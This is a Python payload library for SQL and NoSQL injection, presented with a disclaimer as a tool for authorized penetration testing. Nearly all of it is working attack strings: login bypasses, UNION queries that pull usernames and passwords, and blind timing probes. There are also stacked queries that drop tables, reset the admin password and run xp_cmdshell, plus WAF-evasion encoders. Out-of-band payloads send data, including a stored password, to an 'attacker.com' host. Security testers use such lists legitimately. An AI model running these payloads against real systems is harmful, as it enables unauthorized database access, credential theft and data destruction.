"""
SQL Injection Payloads Library - Enhanced Edition

IMPORTANT LEGAL NOTICE:
This library is intended ONLY for authorized security testing, penetration testing,
bug bounty programs, and educational purposes. Unauthorized access to computer systems
is illegal. Always obtain explicit written permission before testing any system.

Usage of this library for attacking targets without consent is illegal and unethical.
The developers assume no liability for misuse of this tool.
"""

import urllib.parse
import base64
from typing import List, Dict, Optional, Callable
from enum import Enum


class InjectionContext(Enum):
    """Defines different injection contexts."""
    GENERAL = "general"
    LOGIN = "login"
    SEARCH = "search"
    NUMERIC = "numeric"
    STRING = "string"
    ORDER_BY = "order_by"
    LIMIT = "limit"
    JSON = "json"
    XML = "xml"


class DatabaseType(Enum):
    """Supported database types."""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    MONGODB = "mongodb"
    GENERIC = "generic"


# ============================================================================
# CLASSIC SQL INJECTION PAYLOADS
# ============================================================================

# Error-based SQL injection payloads
ERROR_BASED = [
    # Single quote tests
    "'",
    "''",
    "' '",
    
    # Double quote tests
    '"',
    '""',
    '" "',
    
    # Boolean-based
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "') OR ('a'='a",
    
    # ORDER BY probes (column enumeration)
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 3--",
    "' ORDER BY 5--",
    "' ORDER BY 10--",
    "' ORDER BY 20--",
    "' ORDER BY 50--",
    
    # Basic UNION attempts
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    
    # Commented variations
    "admin'--",
    "admin' #",
    "admin'/*",
    
    # Negative tests (should fail)
    "' AND '1'='2",
    "' AND 1=2--",
    
    # Concatenation tests
    "' || '",
    "' + '",
    
    # Numeric context
    "1 OR 1=1",
    "1 AND 1=1",
    "1' OR '1'='1",
]

# Blind Boolean-based SQL injection payloads
BLIND_BOOLEAN = [
    # True conditions
    "' AND 1=1--",
    "' AND 'a'='a",
    "1' AND 1=1--",
    "' OR 1=1--",
    "1 AND 1=1",
    "' AND 'x'='x",
    "') AND ('1'='1",
    
    # False conditions (for comparison)
    "' AND 1=2--",
    "' AND 'a'='b",
    "1' AND 1=2--",
    "' OR 1=2--",
    "1 AND 1=2",
    "' AND 'x'='y",
    "') AND ('1'='2",
    
    # Substring-based blind
    "' AND SUBSTRING(@@version,1,1)='5",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--",
    
    # Length-based
    "' AND LENGTH(database())>5--",
    "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--",
]

# Time-based blind SQL injection payloads
TIME_BASED = {
    DatabaseType.MYSQL: [
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
        "1; SELECT SLEEP(5)",
        "' OR IF(1=1,SLEEP(5),0)--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' OR (SELECT SLEEP(5))--",
        "' OR BENCHMARK(10000000,MD5('A'))--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        # Conditional time-based
        "' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--",
        "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",
    ],
    DatabaseType.POSTGRESQL: [
        "' OR pg_sleep(5)--",
        "1' AND pg_sleep(5)--",
        "'; SELECT pg_sleep(5)--",
        "' OR (SELECT pg_sleep(5))--",
        "' AND (SELECT 1 FROM pg_sleep(5))--",
        "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--",
    ],
    DatabaseType.MSSQL: [
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'",
        "' OR WAITFOR DELAY '0:0:5'--",
        "' AND WAITFOR DELAY '0:0:5'--",
        "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    DatabaseType.ORACLE: [
        "' OR DBMS_LOCK.SLEEP(5)--",
        "1' AND DBMS_LOCK.SLEEP(5)--",
        "' AND DBMS_LOCK.SLEEP(5)--",
        "' OR (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)--",
    ],
    DatabaseType.SQLITE: [
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT 1),0x3a,RANDOMBLOB(1000000000/2))x FROM information_schema.columns GROUP BY x))--",
        "' OR LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--",
    ],
}

# UNION-based SQL injection payloads
UNION_BASED = [
    # NULL-based column discovery
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    
    # UNION ALL variations
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT 1,2--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION ALL SELECT 1,2,3,4--",
    "' UNION ALL SELECT 1,2,3,4,5--",
    
    # Information extraction
    "' UNION SELECT @@version,NULL--",
    "' UNION SELECT database(),user()--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
    
    # Stacked UNION queries
    "' UNION SELECT NULL,NULL,NULL-- AND '1'='1",
    "1' UNION SELECT NULL,NULL,NULL-- ",
    "-1' UNION SELECT 1,2,3--",
]

# Stacked queries (multi-statement)
STACKED_QUERIES = [
    # Data manipulation
    "'; INSERT INTO users VALUES('hacker','hacked123')--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "'; DELETE FROM logs--",
    "'; DROP TABLE logs--",
    
    # Command execution (MSSQL)
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;--",
    "'; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--",
    
    # Information gathering
    "'; SELECT * FROM information_schema.tables--",
    "'; SELECT * FROM users--",
]

# Authentication bypass payloads
AUTH_BYPASS = [
    # Classic OR-based bypasses
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    
    # Admin user targeting
    "admin'--",
    "admin' #",
    "admin'/*",
    "administrator'--",
    "admin' OR '1'='1",
    "admin' OR '1'='1'--",
    "admin' OR 1=1--",
    
    # Parenthesis variations
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "') OR 1=1--",
    "' OR ''='",
    "' OR 1 --'",
    
    # No space variations
    "'OR'1'='1",
    "'OR'1'='1'--",
    "admin'OR'1'='1",
    
    # Alternative operators
    "' or 1=1--",
    "' or 1=1#",
    "' or ''-'",
    "' or '' '",
    "' or ''&'",
    "' or ''^'",
    "' or ''*'",
    
    # Boolean alternatives
    "or true--",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "' OR 'a'='a",
    "') OR ('a'='a",
    
    # Double username/password
    "admin' AND '1'='1",
    "admin' AND 1=1--",
]

# Out-of-band (OOB) SQL injection payloads
OUT_OF_BAND = {
    DatabaseType.MYSQL: [
        "' UNION SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\a')--",
        "' OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\\\\\',@@version,'.attacker.com\\\\a')))--",
    ],
    DatabaseType.MSSQL: [
        "'; exec master..xp_dirtree '\\\\\\\\attacker.com\\\\a'--",
        "'; exec master..xp_fileexist '\\\\\\\\attacker.com\\\\a'--",
        "'; DECLARE @q varchar(99);SET @q='\\\\\\\\attacker.com\\\\a';exec master.dbo.xp_dirtree @q--",
    ],
    DatabaseType.ORACLE: [
        "' OR UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1))--",
        "' OR UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--",
    ],
    DatabaseType.POSTGRESQL: [
        "' OR COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--",
    ],
}

# ============================================================================
# MODERN & ADVANCED PAYLOADS
# ============================================================================

# NoSQL injection payloads (MongoDB, CouchDB, etc.)
NOSQL = [
    # MongoDB query operators
    "{'$gt': ''}",
    "{'$ne': ''}",
    "{'$regex': '.*'}",
    "{'$where': '1==1'}",
    "{'$nin': []}",
    
    # JavaScript injection in MongoDB
    "true, $where: '1 == 1'",
    ", $where: '1 == 1'",
    "$where: function() { return true; }",
    "$where: 'sleep(5000)'",
    
    # Breaking out of context
    "'; return true; var foo='",
    "'; while(true){}; var foo='",
    "' || '1'=='1",
    "' && '1'=='1",
    
    # Array operations
    "[$ne]=1",
    "[$regex]=.*",
    "[$gt]=",
    
    # URL-encoded versions
    "%7B%22%24ne%22%3A%22%22%7D",  # {"$ne":""}
    "%7B%22%24gt%22%3A%22%22%7D",  # {"$gt":""}
]

# JSON-based SQL injection
JSON_INJECTION = [
    '{"username": "admin", "password": {"$gt": ""}}',
    '{"username": "admin", "password": {"$ne": ""}}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"username": "admin\\"; --", "password": "x"}',
    '{"username": "admin", "password": "x\\" OR 1=1--"}',
]

# XML-based SQL injection (for SOAP/XML APIs)
XML_INJECTION = [
    "<username>admin' OR '1'='1</username>",
    "<username>admin'--</username>",
    "<username><![CDATA[admin' OR '1'='1]]></username>",
    "</username><username>admin</username><!--",
]

# Second-order SQL injection (payloads that exploit stored data)
SECOND_ORDER = [
    "admin'--",
    "test' OR '1'='1",
    "user'; DROP TABLE logs--",
    "data'); DELETE FROM sessions--",
]

# ============================================================================
# WAF EVASION TECHNIQUES
# ============================================================================

# Case variation evasion
CASE_EVASION = [
    "' Or '1'='1",
    "' oR '1'='1",
    "' OR '1'='1",
    "' UnIoN SeLeCt",
    "' uNiOn aLl sElEcT",
]

# Comment-based evasion
COMMENT_EVASION = [
    "' OR/**/1=1--",
    "' UNION/**/SELECT/**/NULL--",
    "' OR/**/'1'='1",
    "1'/**/AND/**/1=1--",
    "'/**/OR/**/1=1--",
    "' OR 1=1#",
    "' OR 1=1-- -",
]

# Whitespace evasion
WHITESPACE_EVASION = [
    "'OR'1'='1",
    "'UNION(SELECT(NULL))--",
    "'+OR+'1'='1",
    "'%09OR%091=1--",  # Tab character
    "'%0aOR%0a1=1--",  # Line feed
    "'%0dOR%0d1=1--",  # Carriage return
]

# Encoding-based evasion
ENCODING_EVASION = [
    # URL encoding
    "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1
    "%27%20UNION%20SELECT%20NULL--",
    
    # Double URL encoding
    "%2527%2520OR%2520%25271%2527%253D%25271",
    
    # Unicode
    "\\u0027 OR \\u0031=\\u0031--",
    
    # Hex encoding
    "0x27204f52203127203d2027312027",  # ' OR '1' = '1'
]

# Database-specific evasion techniques
DB_SPECIFIC_EVASION = {
    DatabaseType.MYSQL: [
        "' OR 1=1/*!50000AND 1=1*/--",
        "/*!50000UNION*//*!50000SELECT*/NULL--",
        "' /*!OR*/ 1=1--",
        "' OR 1=1#%0a",
        "'||'1'='1",
        "' OR '1'='1'--+-",
    ],
    DatabaseType.MSSQL: [
        "' OR 1=1;--",
        "' UNION SELECT NULL--",
        "' OR 1=1--",
        "'; EXEC xp_cmdshell('whoami')--",
    ],
    DatabaseType.POSTGRESQL: [
        "' OR 1=1--",
        "' OR '1'::text='1'",
        "' OR 1=1;--",
    ],
    DatabaseType.ORACLE: [
        "' OR '1'='1'--",
        "' UNION SELECT NULL FROM DUAL--",
        "' OR 1=1--",
    ],
}

# ============================================================================
# PAYLOAD GENERATOR & UTILITIES
# ============================================================================

class PayloadEncoder:
    """Encodes payloads for various evasion techniques."""
    
    @staticmethod
    def url_encode(payload: str) -> str:
        """URL encode a payload."""
        return urllib.parse.quote(payload)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode a payload."""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 encode a payload."""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode a payload."""
        return '0x' + payload.encode().hex()
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode a payload."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def add_comments(payload: str) -> str:
        """Add inline comments to payload."""
        return payload.replace(' ', '/**/')
    
    @staticmethod
    def remove_spaces(payload: str) -> str:
        """Remove spaces from payload."""
        return payload.replace(' ', '')
    
    @staticmethod
    def random_case(payload: str) -> str:
        """Randomize case in payload."""
        import random
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)


class PayloadGenerator:
    """Generates context-aware SQL injection payloads."""
    
    def __init__(self):
        self.encoder = PayloadEncoder()
    
    def get_payloads(
        self,
        context: InjectionContext = InjectionContext.GENERAL,
        db_type: Optional[DatabaseType] = None,
        encode: bool = False,
        evasion: bool = False
    ) -> List[str]:
        """
        Get payloads for specific context and database type.
        
        Args:
            context: Injection context (login, search, numeric, etc.)
            db_type: Target database type
            encode: Whether to apply encoding
            evasion: Whether to include evasion techniques
            
        Returns:
            List of appropriate payloads
        """
        payloads = []
        
        # Select base payloads based on context
        if context == InjectionContext.LOGIN:
            payloads = AUTH_BYPASS.copy()
        elif context == InjectionContext.SEARCH:
            payloads = ERROR_BASED + UNION_BASED
        elif context == InjectionContext.NUMERIC:
            payloads = [
                "1 OR 1=1",
                "1 AND 1=1",
                "1; SELECT 1",
                "1' OR '1'='1",
                "1) OR (1=1",
                "-1 UNION SELECT NULL",
            ]
        elif context == InjectionContext.ORDER_BY:
            payloads = [
                "1 ASC",
                "1 DESC",
                "(SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)",
                "1,(SELECT 1 FROM (SELECT SLEEP(5))a)",
            ]
        elif context == InjectionContext.JSON:
            payloads = JSON_INJECTION.copy()
        elif context == InjectionContext.XML:
            payloads = XML_INJECTION.copy()
        else:
            payloads = ERROR_BASED + BLIND_BOOLEAN + UNION_BASED + AUTH_BYPASS
        
        # Add database-specific payloads
        if db_type and db_type in TIME_BASED:
            payloads.extend(TIME_BASED[db_type])
        
        # Add evasion techniques
        if evasion:
            payloads.extend(CASE_EVASION)
            payloads.extend(COMMENT_EVASION)
            payloads.extend(WHITESPACE_EVASION)
            
            if db_type and db_type in DB_SPECIFIC_EVASION:
                payloads.extend(DB_SPECIFIC_EVASION[db_type])
        
        # Apply encoding if requested
        if encode:
            encoded_payloads = []
            for payload in payloads:
                encoded_payloads.append(self.encoder.url_encode(payload))
                encoded_payloads.append(self.encoder.double_url_encode(payload))
            payloads.extend(encoded_payloads)
        
        return payloads
    
    def generate_time_based(
        self,
        db_type: DatabaseType,
        delay_seconds: int = 5,
        condition: Optional[str] = None
    ) -> List[str]:
        """
        Generate time-based blind SQL injection payloads.
        
        Args:
            db_type: Database type
            delay_seconds: Delay in seconds
            condition: Optional condition to test (e.g., "1=1")
            
        Returns:
            List of time-based payloads
        """
        payloads = []
        
        if db_type == DatabaseType.MYSQL:
            sleep_func = f"SLEEP({delay_seconds})"
            if condition:
                payloads.append(f"' AND IF({condition},{sleep_func},0)--")
                payloads.append(f"' OR IF({condition},{sleep_func},0)--")
            else:
                payloads.append(f"' OR {sleep_func}--")
                payloads.append(f"1' AND {sleep_func}--")
        
        elif db_type == DatabaseType.POSTGRESQL:
            sleep_func = f"pg_sleep({delay_seconds})"
            if condition:
                payloads.append(f"' AND (SELECT CASE WHEN ({condition}) THEN {sleep_func} ELSE 1 END)--")
            else:
                payloads.append(f"' OR {sleep_func}--")
                payloads.append(f"1' AND {sleep_func}--")
        
        elif db_type == DatabaseType.MSSQL:
            delay = f"'0:0:{delay_seconds}'"
            if condition:
                payloads.append(f"'; IF ({condition}) WAITFOR DELAY {delay}--")
            else:
                payloads.append(f"'; WAITFOR DELAY {delay}--")
                payloads.append(f"' OR WAITFOR DELAY {delay}--")
        
        return payloads
    
    def generate_union_select(
        self,
        num_columns: int,
        extract_data: Optional[Dict[str, str]] = None
    ) -> List[str]:
        """
        Generate UNION SELECT payloads with specific column count.
        
        Args:
            num_columns: Number of columns in original query
            extract_data: Dict mapping column positions to data to extract
            
        Returns:
            List of UNION SELECT payloads
        """
        payloads = []
        
        # NULL-based discovery
        nulls = ','.join(['NULL'] * num_columns)
        payloads.append(f"' UNION SELECT {nulls}--")
        payloads.append(f"' UNION ALL SELECT {nulls}--")
        
        # Number-based
        numbers = ','.join(str(i) for i in range(1, num_columns + 1))
        payloads.append(f"' UNION SELECT {numbers}--")
        
        # Data extraction
        if extract_data:
            columns = ['NULL'] * num_columns
            for pos, data in extract_data.items():
                if 0 <= int(pos) < num_columns:
                    columns[int(pos)] = data
            payloads.append(f"' UNION SELECT {','.join(columns)}--")
        
        return payloads


# ============================================================================
# CONVENIENCE FUNCTIONS
# ============================================================================

def get_payloads_for_context(
    context: str = "general",
    db_type: Optional[str] = None,
    include_evasion: bool = False
) -> List[str]:
    """
    Get appropriate payloads for a given context (legacy function).
    
    Args:
        context: Type of injection context
        db_type: Database type (optional)
        include_evasion: Include WAF evasion payloads
        
    Returns:
        List of payloads
    """
    generator = PayloadGenerator()
    
    # Map string context to enum
    context_map = {
        "general": InjectionContext.GENERAL,
        "login": InjectionContext.LOGIN,
        "search": InjectionContext.SEARCH,
        "numeric": InjectionContext.NUMERIC,
        "json": InjectionContext.JSON,
        "xml": InjectionContext.XML,
    }
    
    # Map string db_type to enum
    db_map = {
        "mysql": DatabaseType.MYSQL,
        "postgresql": DatabaseType.POSTGRESQL,
        "mssql": DatabaseType.MSSQL,
        "oracle": DatabaseType.ORACLE,
        "sqlite": DatabaseType.SQLITE,
        "mongodb": DatabaseType.MONGODB,
    }
    
    ctx = context_map.get(context.lower(), InjectionContext.GENERAL)
    db = db_map.get(db_type.lower()) if db_type else None
    
    return generator.get_payloads(context=ctx, db_type=db, evasion=include_evasion)


def get_all_payloads() -> List[str]:
    """Get all available SQL injection payloads."""
    return (
        ERROR_BASED +
        BLIND_BOOLEAN +
        UNION_BASED +
        AUTH_BYPASS +
        STACKED_QUERIES +
        NOSQL +
        list(JSON_INJECTION) +
        list(XML_INJECTION)
    )


# All payloads combined (for backward compatibility)
ALL_PAYLOADS = get_all_payloads()


if __name__ == "__main__":
    """Example usage demonstrating the library capabilities."""
    
    print("=" * 70)
    print("SQL INJECTION PAYLOADS LIBRARY - EXAMPLE USAGE")
    print("=" * 70)
    print()
    
    # Example 1: Context-aware payloads
    print("Example 1: Login Form Payloads")
    print("-" * 70)
    login_payloads = get_payloads_for_context("login")
    for i, payload in enumerate(login_payloads[:5], 1):
        print(f"{i}. {payload}")
    print(f"... ({len(login_payloads)} total)")
    print()
    
    # Example 2: Database-specific time-based payloads
    print("Example 2: MySQL Time-Based Payloads")
    print("-" * 70)
    generator = PayloadGenerator()
    time_payloads = generator.generate_time_based(DatabaseType.MYSQL, delay_seconds=5)
    for i, payload in enumerate(time_payloads, 1):
        print(f"{i}. {payload}")
    print()
    
    # Example 3: UNION SELECT with column detection
    print("Example 3: UNION SELECT (3 columns)")
    print("-" * 70)
    union_payloads = generator.generate_union_select(3)
    for i, payload in enumerate(union_payloads, 1):
        print(f"{i}. {payload}")
    print()
    
    # Example 4: Encoded payloads
    print("Example 4: Encoded Payloads")
    print("-" * 70)
    encoder = PayloadEncoder()
    sample_payload = "' OR 1=1--"
    print(f"Original: {sample_payload}")
    print(f"URL Encoded: {encoder.url_encode(sample_payload)}")
    print(f"Double URL: {encoder.double_url_encode(sample_payload)}")
    print(f"Hex: {encoder.hex_encode(sample_payload)}")
    print()
    
    # Example 5: WAF evasion
    print("Example 5: WAF Evasion Payloads")
    print("-" * 70)
    evasion_payloads = get_payloads_for_context("general", include_evasion=True)
    for i, payload in enumerate([p for p in evasion_payloads if '/**/' in p or '%' in p][:5], 1):
        print(f"{i}. {payload}")
    print()
    
    print("=" * 70)
    print(f"Total payloads available: {len(ALL_PAYLOADS)}")
    print("=" * 70)